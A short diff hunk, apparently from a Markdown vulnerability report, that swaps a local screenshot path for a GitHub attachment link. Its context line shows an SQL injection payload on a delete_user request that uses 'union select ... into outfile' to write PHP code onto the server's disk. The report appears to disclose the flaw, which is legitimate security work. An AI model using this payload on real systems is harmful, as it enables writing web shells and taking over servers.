@@ -70,4 +70,4 @@ action=delete_user&userid=1'+union+select+'<?php phpinfo();?>'+into+outfile+'D:/
 
 result
 
-![image-20241111092339446](sql24未交高.assets/image-20241111092339446.png)
+![image-20241111092339446](https://github.com/user-attachments/assets/4c7f05fa-02f1-4b0b-994f-95f8be2f716b)
